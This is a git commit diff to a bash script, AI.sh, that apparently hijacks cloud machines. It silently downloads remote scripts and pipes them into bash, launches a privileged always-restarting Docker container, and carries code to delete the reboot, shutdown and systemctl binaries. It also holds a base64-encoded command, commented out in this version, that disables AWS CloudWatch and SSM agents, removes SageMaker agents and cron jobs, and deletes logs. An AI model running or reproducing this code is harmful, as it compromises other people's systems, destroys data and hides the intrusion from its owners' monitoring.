9ac3c1b71d71aaa02031fc1239bb798475e35f53
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-09-07 15:27:59 +0800

    Update AI.sh

--- AI.sh
+++ AI.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
-sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
-#20240802#
+###sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+
 
 bash -c "wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --privileged --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
 ##bash -c "docker run -dt --privileged --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
 
 
-##bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
+bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
 
 ###/bin/sh -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9zc20tYWdlbnQtd29ya2VyIC91c3IvYmluL2FtYXpvbi1zc20tYWdlbnQgL3Vzci9zYmluL3JvbGUtYWdlbnQgL3Vzci9saWJleGVjL3Bvc3RmaXgvbWFzdGVyIC9vcHQvYXdzL2FtYXpvbi1jbG91ZHdhdGNoLWFnZW50IC9ldGMvb3B0L21sL3NjcmlwdHMvY2xlYW4tanVweXRlci1sb2cgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItbmJpLWFnZW50IC9ldGMvb3B0L21sL3NjcmlwdHMvcmVzdGFydC1zYWdlbWFrZXItYWdlbnQtd2F0Y2hlciAvZXRjL29wdC9tbC9zY3JpcHRzL3JlbGF1bmNoLWRvY2tlci1zZXJ2aWNlIC9ldGMvb3B0L21sL3NjcmlwdHMvc2FnZW1ha2VyLXJvbGUtcHJveHktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zZXQtdXAtYWdlbnQtbmFtZXNwYWNlIC91c3Ivc2Jpbi9zYW1wbGUtbm90ZWJvb2tzLWNvbmZpZyAvb3B0Ly5zYWdlbWFrZXIvYWRkX2Nsb3VkX3dhdGNoX2FnZW50X2NvbmZpZ3VyYXRpb24ucHkgL2V0Yy9jcm9uLmQvKiAvZXRjL2Nyb24uZGFpbHkvKiAvZXRjL2Nyb24uaG91cmx5Lyo7IHN1ZG8gZmluZCAvdmFyL2xvZyAtdHlwZSBmIC1kZWxldGU7Cg==' |base64 -d |/bin/bash" >/dev/null 2>&1 &
 ##bash -c "sleep 150 && reboot" >/dev/null 2>&1 &
